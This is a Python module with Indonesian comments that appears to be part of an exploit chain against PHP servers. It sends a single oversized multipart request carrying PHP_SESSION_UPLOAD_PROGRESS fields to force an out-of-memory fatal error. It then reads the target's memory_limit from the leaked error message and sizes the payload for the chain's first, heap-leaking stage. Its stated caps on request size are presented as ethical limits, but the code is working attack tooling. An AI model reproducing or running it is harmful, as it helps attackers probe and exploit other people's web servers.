"""lib/memprobe.py — baca `memory_limit` target lewat SATU request.

Kenapa modul ini ada
--------------------
Rantai stage 1 (`_big_field`) mengirim field multipart sebesar `huge_mb`
megabita. Field itu HARUS lebih besar dari `memory_limit` target, kalau tidak
PHP tidak OOM dan seluruh rantai berhenti di tahap nol.

Sebelum modul ini, nilainya hardcoded 12 MB dan operator harus menebak:

    hugo_mb=12 -> 8M  : OOM (bagus)
    huge_mb=12 -> 128M: TIDAK OOM, rantai mati tanpa penjelasan
    huge_mb=12 -> 512M: TIDAK OOM, dan kita mengirim 12 MB sia-sia

Dua kegagalan itu terlihat sama dari luar ("stage1 gagal"), padahal
sebabnya berbeda dan biayanya beda. Menebak lebih besar (misal 256 MB)
"menyelesaikan" masalah dengan mengirim ratusan MB ke target orang —
lambat, mencurigakan di log, dan melanggar prinsip minimum-impact.

Cara kerjanya
-------------
PHP menulis `memory_limit` ke dalam pesan fatal OOM:

    Fatal error: Allowed memory size of 134217728 bytes exhausted
    (tried to allocate 20480 bytes) in ...

Nilai 134217728 = 128 MiB. Itu satu-satunya kebocoran yang kita butuhkan,
dan muncul di respons biasa (kalau `display_errors=On`) atau di log.

Yang membuat ini satu request: kita tidak perlu OOM dulu untuk membaca
angkanya — kita kirim field multipart yang ukurannya sengaja melewati
beberapa kandidat batas sekaligus, lalu parse angka dari pesan fatal.
Kalau target memakai `display_errors=Off`, angkanya tidak muncul; probe
mengembalikan `unknown` dan pemanggil memakai default konservatif.
Tidak ada tebakan yang dipaksakan.

Batas etis
----------
Probe ini mengirim satu request berukuran sekitar `probe_mb` dan berhenti.
Tidak ada loop, tidak ada eskalasi ukuran otomatis, tidak ada retry
tanpa batas. Kalau target tidak membocorkan angkanya, kita menyerah dan
bilang "tidak diketahui" — bukan menyapu 256 MB sampai berhasil.
"""

from __future__ import annotations

import re

# Pesan fatal PHP, beberapa varian lintas versi:
#   8.x : "Allowed memory size of 134217728 bytes exhausted (tried to allocate ...)"
#   7.x : sama
#   5.x : "Allowed memory size of 134217728 bytes exhausted (tried to allocate ...)"
# Beberapa build memakai "Out of memory (allocated ...)" tanpa angka limit.
_ALLOWED = re.compile(
    rb"Allowed memory size of\s+(\d+)\s+bytes exhausted", re.IGNORECASE)
_LIMIT_HDR = re.compile(
    rb"memory_limit[^0-9]{0,40}(\d+)\s*([KMG]?)", re.IGNORECASE)

_UNITS = {"": 1, b"": 1, "K": 1024, b"K": 1024,
          "M": 1024 ** 2, b"M": 1024 ** 2,
          "G": 1024 ** 3, b"G": 1024 ** 3}

# Batas atas yang kita terima sebagai "masuk akal". Di atas ini, angka yang
# terbaca hampir pasti artefak (mis. potongan Content-Length), bukan limit.
_SANE_MAX = 8 * 1024 ** 3

# Plafon ukuran field `big` yang kami anggap masih aman dikirim ke target
# orang lain. Ini JUGA nilai cap di `huge_mb_for` — diekspor supaya pemanggil
# bisa membedakan "cukup untuk OOM" dari "ditahan plafon, tidak akan OOM".
SAFE_CEILING_MB = 512


def safe_ceiling_mb() -> int:
    """Plafon ukuran field `big` dalam MB (`SAFE_CEILING_MB`)."""
    return SAFE_CEILING_MB


def exceeds_safe_ceiling(limit_bytes: int | None) -> bool:
    """True bila memory_limit target >= plafon aman.

    Kalau benar, `huge_mb_for()` akan mengembalikan nilai yang DITAHAN plafon
    — artinya field `big` tidak mungkin dibuat lebih besar dari limit tanpa
    melewati batas aman, dan stage-1 hampir pasti tidak OOM. Pemanggil wajib
    berhenti dengan alasan eksplisit, bukan melanjutkan lalu melaporkan
    "HEAP_LEAK_FAILED" tanpa sebab.
    """
    if not limit_bytes or limit_bytes <= 0:
        return False
    return limit_bytes / (1024 ** 2) >= SAFE_CEILING_MB


# ------------------------------------------------------------------ R2-03 ---
# Satu-satunya validator ukuran field `big` di lapisan business logic.
# Diletakkan di sini (bukan di exploit_runner) karena `lib/chain.py` juga
# membuat payload dan TIDAK boleh mengimpor exploit_runner (siklus impor).
# argparse hanya menjaga jalur CLI; pemanggil API Python langsung
# (Chain(t, "id", huge_mb=10**9), run(huge_mb=-1)) harus tertahan di sini.
def validate_huge_mb(value: object, *, floor: int = 1,
                     cap: int | None = None) -> int:
    """Validasi & normalisasi ukuran field `big` (MB).

    Menolak (ValueError): bool, non-int (str/float/None), < floor, > cap.
    Mengembalikan int yang sudah tervalidasi — pemanggil memakai nilai
    kembalian ini, bukan nilai mentahnya.
    """
    top = SAFE_CEILING_MB if cap is None else int(cap)
    if isinstance(value, bool) or not isinstance(value, int):
        raise ValueError(
            f"huge_mb harus int (MB), bukan {type(value).__name__}: {value!r}")
    if value < floor:
        raise ValueError(
            f"huge_mb={value} < {floor}: field 'big' minimal {floor} MB; "
            f"0/negatif tidak punya arti di sisi target")
    if value > top:
        raise ValueError(
            f"huge_mb={value} melewati plafon aman {top} MB "
            f"(SAFE_CEILING_MB); field 'big' sebesar itu tidak pernah dikirim")
    return value


# PHP menolak body sebelum skrip jalan. Pesannya berbeda dari OOM biasa:
#   Warning: POST Content-Length of N bytes exceeds the limit of M bytes
# Ini bukan leak, tapi justru INFORMASI: kita jadi tahu batas body target,
# dan tahu stage-1 mustahil berhasil di sana.
_POST_TOO_BIG = re.compile(
    rb"POST\s+Content-Length\s+of\s+\d+\s+bytes\s+exceeds\s+the\s+limit",
    re.I)


def parse_limit(resp: bytes) -> int | None:
    """Ambil memory_limit (byte) dari respons. None kalau tidak terbocorkan."""
    if not resp:
        return None

    m = _ALLOWED.search(resp)
    if m:
        try:
            n = int(m.group(1))
        except ValueError:
            return None
        if 0 < n <= _SANE_MAX:
            return n

    m = _LIMIT_HDR.search(resp)
    if m:
        try:
            n = int(m.group(1))
        except ValueError:
            return None
        unit = m.group(2).upper()
        n *= _UNITS.get(unit, _UNITS.get(unit.decode(), 1))
        if 0 < n <= _SANE_MAX:
            return n

    return None


def huge_mb_or_none(limit_bytes: int | None, *, headroom: float = 1.15,
                    floor_add_mb: int = 2) -> int | None:
    """Ukuran field `big` yang menjamin OOM, atau **None** bila limit tak terbaca.

    Ini varian JUJUR dari `huge_mb_for()`: tidak ada default diam-diam. Modul
    ini sendiri sudah menolak menebak ("Kalau target tidak membocorkan angkanya,
    kita menyerah dan bilang tidak diketahui"), tapi pemanggil lama menyambung
    `huge_mb_for(None) -> 12 MB` sehingga tebakan itu kembali lewat pintu
    belakang. Pemanggil yang tidak punya ukuran tervalidasi WAJIB memakai
    fungsi ini dan berhenti, bukan menembak dengan 12 MB.
    """
    if not limit_bytes or limit_bytes <= 0:
        return None
    return _huge_mb_for_limit(limit_bytes, headroom=headroom,
                              floor_add_mb=floor_add_mb)


def _huge_mb_for_limit(limit_bytes: int, *, headroom: float,
                       floor_add_mb: int) -> int:
    """Perhitungan inti `huge_mb_for`/`huge_mb_or_none` (limit pasti terbaca)."""
    lim_mb = limit_bytes / (1024 ** 2)
    mb = int(max(lim_mb * headroom, lim_mb + floor_add_mb))
    # Batas atas 512 MB: di atas itu target hampir pasti punya limit tak
    # terjangkau dan rantai tidak akan jalan — lebih baik berhenti dan
    # melapor daripada mengirim setengah gigabyte.
    return max(4, min(mb, SAFE_CEILING_MB))


def huge_mb_for(limit_bytes: int | None, *, default_mb: int = 12,
                headroom: float = 1.15, floor_add_mb: int = 2) -> int:
    """Ukuran field `big` yang menjamin OOM, dalam MB.

    Kenapa `floor_add_mb`, bukan persentase saja: pada limit 128 MiB,
    headroom 15% berarti mengirim 148 MB — 20 MB terbuang hanya untuk
    melewati batas. Yang dibutuhkan cuma beberapa MB di atas limit, cukup
    untuk menutup selisih pembulatan alokasi. Jadi dipakai
    `max(15%, +2 MB)` dan hasilnya dibulatkan ke atas.

    Tanpa limit yang diketahui, pakai default (perilaku lama, tidak berubah).
    Pemanggil BARU yang tidak boleh menebak wajib memakai `huge_mb_or_none()`.
    """
    mb = huge_mb_or_none(limit_bytes, headroom=headroom,
                         floor_add_mb=floor_add_mb)
    if mb is None:
        return default_mb
    return mb


def fb_for(limit_bytes: int | None, *, default_mb: int = 12) -> int:
    """Huge-mb yang dipakai rantai, dengan alasan yang bisa dicetak."""
    return huge_mb_for(limit_bytes, default_mb=default_mb)


def format_mb(n: int) -> str:
    if n >= 1024 ** 2:
        return f"{n / (1024 ** 2):.0f} MiB"
    if n >= 1024:
        return f"{n / 1024:.0f} KiB"
    return f"{n} B"


def describe(limit_bytes: int | None, chosen_mb: int | None, cap: str = "unknown"
             ) -> str:
    """Satu baris penjelasan untuk preflight/verbose.

    `chosen_mb=None`/0 berarti ukuran field BELUM ditentukan (limit tak
    terbaca dan tidak ada --huge-mb) — kalimatnya tidak boleh berbunyi
    "pakai default 12 MB", karena itu justru tebakan yang dihentikan audit.
    """
    if limit_bytes:
        if exceeds_safe_ceiling(limit_bytes):
            # Dibedakan dari "limit sedang terbaca": di sini tidak ada ukuran
            # field yang cukup untuk OOM tanpa melewati plafon aman.
            return (f"memory_limit {format_mb(limit_bytes)} terbaca dari target; "
                    f"limit target {limit_bytes // (1024 ** 2)} MiB melebihi "
                    f"batas aman {SAFE_CEILING_MB} MiB — field 'big' ditahan "
                    f"{chosen_mb} MB, stage-1 tidak akan OOM")
        return (f"memory_limit {format_mb(limit_bytes)} terbaca dari target; "
                f"field 'big' disetel {chosen_mb} MB (harus > limit)")
    if cap == "rejected":
        # Bukan soal display_errors: body-nya memang dibuang sebelum skrip
        # jalan, jadi tidak ada yang bisa membocorkan limit.
        return ("body 16 MB ditolak target sebelum skrip jalan — "
                "post_max_size terlalu kecil untuk stage-1")
    if not chosen_mb:
        # chosen_mb=0/None eksplisit: bukan "default 12 MB", melainkan
        # "belum ditentukan" — pemanggil (exploit_runner) sudah berhenti.
        return ("memory_limit tidak terbaca (display_errors mungkin Off); "
                "ukuran field 'big' TIDAK ditentukan — eksploitasi otomatis "
                "dihentikan, berikan --huge-mb tervalidasi")
    return (f"memory_limit tidak terbaca (display_errors mungkin Off); "
            f"field 'big' pakai default {chosen_mb} MB")


# ---------------------------------------------------------------- probe ---

def probe(target_url: str, *, probe_mb: int = 16, timeout: float = 45.0,
          verbose: bool = False, deadline: float | None = None
          ) -> tuple[int | None, bytes]:
    """Kirim SATU request multipart yang melewati memory_limit.

    Mengembalikan (limit_bytes | None, body_respons). Tidak pernah melempar
    untuk kegagalan jaringan biasa — pemanggil memutuskan apa artinya.

    `deadline` (opsional, waktu absolut di jam time.monotonic) diteruskan ke
    `Target`: probe 16 MB adalah request jaringan terbesar sebelum rantai, dan
    tanpa deadline ia boleh berjalan 60s walau sisa anggaran run tinggal 2s —
    persis celah "operasi berjalan lebih lama dari max_total_timeout".
    """
    from .chain import Target, build_multipart

    prefer = max(60.0, float(timeout))
    try:
        t = Target(target_url, timeout=prefer, verbose=False, deadline=deadline)
    except TypeError:
        # chain.py versi lama: belum menerima deadline (dan tidak punya
        # op_timeout) — tetap jalan, hanya tanpa batas absolut di sisi probe.
        t = Target(target_url, timeout=prefer, verbose=False)
    boundary = b"P2SMEMPROBE"
    parts = [
        {"name": "PHPSESSID", "data": b"p2s"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p2smem"},
        {"name": "big", "data": b"B" * (probe_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, boundary)
    try:
        resp = t.post(body, boundary, read_cap=1 << 19, timeout=prefer)
    except OSError as e:
        if verbose:
            t.log(f"[!] probe gagal di jaringan: {e}")
        return None, b""
    limit = parse_limit(resp)
    if verbose:
        if limit:
            t.log(f"[+] memory_limit terbaca: {format_mb(limit)}")
        else:
            t.log("[!] memory_limit tidak terbocorkan (display_errors Off?)")
    return limit, resp


def body_cap(resp: bytes, status: int = 0) -> str:
    """Apakah body besar sampai ke PHP? 'accepted' | 'rejected' | 'unknown'.

    Ini pembeda yang hilang selama ini, dan pesan PHP-nya eksplisit —
    terbukti dari dua lab dengan setelan berbeda:

        post_max_size=8M  -> "Warning: POST Content-Length of 16777461
                              bytes exceeds the limit of 8388608 bytes"
        post_max_size=64M -> "Fatal error: Allowed memory size of
                              8388608 bytes exhausted"

    Respons non-kosong saja TIDAK cukup untuk menyimpulkan body diterima:
    peringatan "exceeds the limit" juga berupa HTML 200 yang wajar. Yang
    membedakan adalah jenis pesannya, bukan ada/tidaknya respons.
    """
    if status in (413, 400):
        return "rejected"
    if not resp:
        # Kosong total: paling mungkin body dibuang, tapi bisa juga koneksi
        # diputus WAF. Jangan mengaku tahu.
        return "unknown"
    if _POST_TOO_BIG.search(resp):
        return "rejected"
    if parse_limit(resp) is not None:
        return "accepted"
    # Ada respons tapi tak ada jejak PHP memproses body. Bisa target yang
    # tidak melakukan apa-apa, bisa WAF. Tidak layak disebut 'accepted'.
    return "unknown"
